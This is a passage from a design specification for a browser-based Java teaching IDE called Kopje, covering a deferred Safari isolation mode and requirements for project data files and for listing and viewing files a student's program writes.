filtering). Maintenance: a third isolation mode and a 1–2 minute longer test suite.

**Why not now.** It only adds origin separation for code that escapes WebAssembly in Safari,
which in development is the owner's own code. It would not make Safari exercise the exam code
path (it would be a third path), so runtime behaviour should still be checked in Chrome/Edge
or with `npm run test:e2e`.

**Open question for the exam laptop (owner).** Does the whitelist apply to top-level visits
only, to subframe navigations, or to all requests? Relevant only if O1 is ever built.

## 16. Data files and program output (2026-11-11)

Exercises with a data file ("read `scores.csv`, write a report") need two things the IDE
lacks: data files in the project, and a way to see what the program wrote. Programs can
already read and write files (F1), but every run starts with an empty file system and
whatever it writes is discarded with the sandbox. Write-back into the project was
considered and rejected: runs would depend on each other, a program could overwrite the
student's sources, and edits during a run would conflict. Instead, output is shown and the
student decides what to keep.

**Principle:** facts only. Kopje never comments on the student's program (no "did you
close the writer?"): it shows names, sizes, "empty", bytes. Messages about Kopje itself
(e.g. that files were captured after Stop) are fine.

| ID | Item | Acceptance |
|---|---|---|
| F2 | **Data files in the project.** Any file name except `.java`/`.class` is allowed, including names without an extension; path segments use letters, digits, `-`, `_`, `.` (no spaces, no `..`, no leading dot), same length limits as sources. Text only; imported and exported with the `// File:` format. Before each run, data files are copied into the working directory at their project path (working directory = project root, so `data/scores.csv` is `new File("data/scores.csv")`); `.java` sources stay out of it. In the file list they are mixed in by folder with a distinct marker, open as plain text, and are skipped by compilation and the main-class scan. **New file** creates an empty file for every name; the package/class template is dropped. | unit: path rules for data names; import/export round trip with data files; e2e: import a project with `data/scores.csv`, a program reads it with `java.io` and `java.nio.file`; data files never reach javac; new files are empty. |
| F3 | **Output files in the console.** The sandbox records the file system just before `main` and compares afterwards; every file created or changed anywhere is listed (working-directory files relative, others by full path; project data files only when their content changed). A bar fixed at the bottom of the console, hidden when nothing was written: header `FILES WRITTEN · N` with a collapse toggle, then one line per file with the name left and facts right (`text · 12 lines · 340 B`, `empty`, `binary · 214 B`); at most 3 lines visible (2 on phones), scrolling inside the bar; at most 50 files, then `+ N more`. Cleared when the next run starts; never stored. Clicking a file opens a read-only viewer: valid UTF-8 text with **Copy** and **Add to project** (overwrite after confirmation; not for `.java`), images, SVG as an image with a source toggle, audio/video (no download control), PDF where `navigator.pdfViewerEnabled`, and a hex view for everything else including invalid UTF-8. No Download button (the browser's own save options can't be prevented and are acceptable). Limits 1 MB per file, 5 MB total, beyond that "truncated". After Stop or a timeout the files are snapshotted before the sandbox is removed and the header says `as they were when the program was stopped`. | e2e: text, empty, binary and image output are listed with the right facts; viewer shows text/image/hex; Copy is exact; Add to project adds a data file; Stop captures files; limits and the 50-file cap; nothing listed for programs without file output; CSP allows `blob:` only where needed. |

**Order:** F2 first (F3 needs it to tell changed input from new output). Within F3: text,
images, SVG and hex; then audio/video; PDF last, after checking it under the CSP and
cross-origin isolation in every browser.
